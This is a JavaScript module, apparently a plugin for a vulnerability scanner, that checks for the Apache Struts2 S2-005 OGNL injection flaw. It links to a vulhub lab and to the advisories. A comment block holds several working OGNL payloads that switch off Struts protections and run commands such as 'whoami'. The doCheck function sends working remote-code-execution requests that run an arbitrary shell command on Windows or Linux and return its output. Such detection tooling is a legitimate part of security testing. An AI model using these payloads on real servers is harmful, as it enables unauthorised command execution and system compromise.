module.exports={
	tags:"struts2,005,ww-3470,xw-641,641,3470,web",
	des:"WW-3470,XW-641,struts2 005Vulnerability detection",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/struts2/s2-005",
		"https://github.com/vulhub/vulhub/raw/master/struts2/s2-005/S2-005.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-005",
		"https://issues.apache.org/jira/browse/WW-3470",
		"http://jira.opensymphony.com/browse/XW-641"],
/*
/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(x)=true&(m)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(t)((%27%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))%27)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1


/example/HelloWorld.action?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(x)=true&(m)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023vccc')(\u0023vccc\u003dnew java.lang.Boolean("false")))&(t)(('\u0023rt.exec("touch@/tmp/success".split("@"))')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1

/example/HelloWorld.action?('#_memberAccess[\'allowStaticMethodAccess\']')(x)=true&(m)(('#context[\'xwork.MethodAccessor.denyMethodExecution\']=#vccc')(#vccc=new java.lang.Boolean("false")))&(t)(('#rt.exec("touch@/tmp/success".split("@"))')(#rt=@java.lang.Runtime@getRuntime()))=1

('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'whoami\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))
*/
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = _t.self;
		var s = ('%{#_memberAccess[\'allowStaticMethodAccess\']=true,#context[\'xwork.MethodAccessor.denyMethodExecution\']=false,#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + _s.g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + _s.g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\')'
			+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]'
			+ ',#wt=#f.getWriter()'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			// + ',#wt.flush()'
			// +',#wt.close()'
			+'}');
		
		var ss = s.replace(/#/gmi, "\\u0023");
		ss = encodeURIComponent(ss);
		ss = _s.fnUrlEncode(ss,"'\\/()[].");
		s = "('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'netstat -an\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))";
		// ss = encodeURIComponent(s);
		_s.request(_s.fnOptHeader({method: 'POST',uri: url + "?" + ss + "=1",
			body: ss + "=1"
		    ,headers:
		    {
		    	"User-Agent": _s.g_szUa,
		    	"Content-Type":"application/x-www-form-urlencoded"
		    }})
		  , function (error, response, body){
		  		_s.error(error);
		  		// console.log(response.headers);
		  		if(body)
		  		{
		  			_s.fnShowBody(body);
		  			// console.log(body);
		  			_s.fnDoBody(body,"s2-005",url,null,function(o)
			    	{
			    		var r = {"url":url,"send":ss};
		  				fnCbk(_s.copyO2O(r,o),_t);
			    	});
		  		}
		    }
		  );
		ss = _s.g_postData.replace(/#/gmi, "\\43");
		ss = encodeURIComponent(ss);
		ss = _s.fnUrlEncode(ss,"'\\/()[].");
		_s.request(_s.fnOptHeader({method: 'GET',uri: url + "?s=" + encodeURIComponent(ss)
		    ,headers:
		    {
		    	"User-Agent": _s.g_szUa,
		    	"Content-Type":"application/x-www-form-urlencoded"
		    }})
		  , function (error, response, body){
		  		_s.error(error);
		  		if(body)
		  		{
		  			_s.fnDoBody(body,"s2-005",url,null,function(o)
			    	{
			    		var r = {"url":url,"send":ss};
		  				fnCbk(_s.copyO2O(r,o),_t);
			    	});
		  		}
		    }
		  );
	}
};